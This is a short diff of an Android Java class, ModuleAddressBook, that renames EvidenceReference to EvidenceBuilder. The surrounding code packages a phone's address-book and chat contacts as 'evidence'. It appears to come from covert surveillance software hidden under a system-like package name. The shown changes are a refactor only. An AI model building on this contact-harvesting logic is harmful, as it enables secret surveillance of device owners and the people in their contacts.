@@ -17,7 +17,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.crypto.Digest;
 import com.android.deviceinfo.db.RecordVisitor;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.interfaces.Observer;
@@ -210,7 +210,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 		boolean needToSerialize = false;
 
-		final EvidenceReference log = new EvidenceReference(EvidenceType.ADDRESSBOOK);
+		final EvidenceBuilder log = new EvidenceBuilder(EvidenceType.ADDRESSBOOK);
 
 		// for every Contact
 		while (iter.hasNext()) {
@@ -394,7 +394,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
 		db_header.writeInt(size);
 
-		EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, payload);
+		EvidenceBuilder.atomic(EvidenceType.ADDRESSBOOK, null, payload);
 	}
 
 	public static boolean createEvidenceRemote(int type, com.android.deviceinfo.module.chat.Contact c) {
@@ -410,7 +410,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (createEvidenceRemote) new address");
 			}
-			EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, packet);
+			EvidenceBuilder.atomic(EvidenceType.ADDRESSBOOK, null, packet);
 		}
 		return needToSerialize;
 	}
